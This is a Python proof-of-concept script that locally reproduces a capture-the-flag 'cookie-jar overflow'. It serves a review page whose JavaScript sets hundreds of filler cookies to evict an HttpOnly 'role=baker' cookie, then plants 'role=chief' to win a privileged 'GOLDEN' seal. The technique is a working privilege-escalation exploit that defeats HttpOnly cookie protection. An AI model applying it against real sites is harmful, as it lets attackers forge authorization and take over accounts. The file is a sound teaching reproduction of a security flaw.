#!/usr/bin/env python3
"""CookieCorp - minimal local reproduction of the cookie-jar overflow.

Replays the browser-side primitive from the challenge against a tiny local
server, using the same headless-Chromium engine the Inspector bot used:

  1. the server logs the "inspector" in: HttpOnly `session` (Priority=High)
     and HttpOnly `role=baker` cookies;
  2. the review page runs the mixer: it sets N filler cookies with
     document.cookie and then a final `role=chief` cookie;
  3. POST /api/seal reads the Cookie header and awards the GOLDEN seal
     iff `role` == "chief" (the challenge's server-side rule).

Expected browser behaviour (RFC 6265 + Chromium cookie store):
  - document.cookie cannot overwrite an HttpOnly cookie, so with N=0 the
    trailing `role=chief` is silently ignored and the seal stays STANDARD;
  - once N exceeds the per-domain cookie limit (~180 in Chromium), the
    least-recently-used default-priority cookies are evicted - `role=baker`
    goes first, while `session` (Priority=High) survives. The trailing
    `role=chief` is then stored normally and the seal becomes GOLDEN.

Run:
    python3 repro_eviction.py [n1 n2 ...]      # default: 0 180 250

Requires: pip install playwright, plus a Chromium binary
(uses $PLAYWRIGHT_CHROMIUM or /usr/bin/chromium).
"""
import http.server
import json
import os
import re
import socketserver
import sys
import threading
from urllib.parse import parse_qs, urlparse

from playwright.sync_api import sync_playwright

HOST = "127.0.0.1"
PORT = 0  # ephemeral; the real port is read from the bound socket
CHROMIUM = os.environ.get("PLAYWRIGHT_CHROMIUM", "/usr/bin/chromium")


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _send(self, code, body, ctype="application/json", cookies=()):
        self.send_response(code)
        for c in cookies:
            self.send_header("Set-Cookie", c)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.startswith("/review"):
            n = int(parse_qs(urlparse(self.path).query).get("n", ["0"])[0])
            mixer = "".join(
                'document.cookie="j%d=x; path=/";\n' % i for i in range(n)
            )
            page = (
                "<!doctype html><meta charset=utf-8><title>review</title>\n"
                "<script>\n%s\n"
                'document.cookie = "role=chief; path=/";\n'
                'fetch("/api/seal", {method:"POST", credentials:"same-origin",\n'
                '      body: JSON.stringify({recipeId:1})})\n'
                "  .then(r => r.json())\n"
                '  .then(d => document.title = JSON.stringify(d));\n'
                "</script>" % mixer
            )
            # login cookies, exactly like the challenge: session is
            # Priority=High, role is default priority; both HttpOnly
            self._send(
                200,
                page.encode(),
                "text/html",
                cookies=(
                    "session=valid; HttpOnly; Path=/; Priority=High",
                    "role=baker; HttpOnly; Path=/",
                ),
            )
        else:
            self._send(200, b"ok", "text/plain")

    def do_POST(self):
        if self.path == "/api/seal":
            cookie = self.headers.get("Cookie", "")
            # server-side rule (matches the challenge): golden iff role==chief.
            # First-wins duplicate handling, like Node's cookie parser.
            m = re.search(r"(?:^|;\s*)role=([^;]*)", cookie)
            role = m.group(1) if m else "none"
            seal = "GOLDEN" if role == "chief" else "STANDARD"
            session = "present" if "session=" in cookie else "MISSING"
            body = json.dumps(
                {"seal": seal, "role": role, "session": session}
            ).encode()
            self._send(200, body)
        else:
            self._send(404, b"no")


def scenario(browser, n, base):
    """Run one review visit with n filler cookies. Returns a result dict."""
    ctx = browser.new_context()
    pg = ctx.new_page()
    try:
        # state before the review: what the Cookie header carries after login
        pg.goto(base + "/")
        pg.goto(base + f"/review?n={n}")
        pg.wait_for_function("document.title.startsWith('{')", timeout=30000)
        res = json.loads(pg.title())
        after_js = pg.evaluate("document.cookie")
        return {
            "n": n,
            **res,
            "role_visible_to_js_after": "role=chief" in after_js,
            "cookies_visible_to_js_after": len(after_js.split("; ")) if after_js else 0,
        }
    finally:
        ctx.close()


class ReusableServer(socketserver.TCPServer):
    allow_reuse_address = True


def main():
    ns = [int(x) for x in sys.argv[1:]] or [0, 180, 250]
    srv = ReusableServer((HOST, PORT), Handler)
    base = f"http://{HOST}:{srv.server_address[1]}"
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=CHROMIUM, headless=True)
        print("filler | seal    | role seen by server | session | role=chief visible to JS")
        print("-------+---------+--------------------+---------+--------------------------")
        for n in ns:
            r = scenario(browser, n, base)
            print(
                "%-6d | %-7s | %-18s | %-7s | %s"
                % (
                    r["n"],
                    r["seal"],
                    r["role"],
                    r["session"],
                    "yes" if r["role_visible_to_js_after"] else "no (ignored/HttpOnly)",
                )
            )
        browser.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())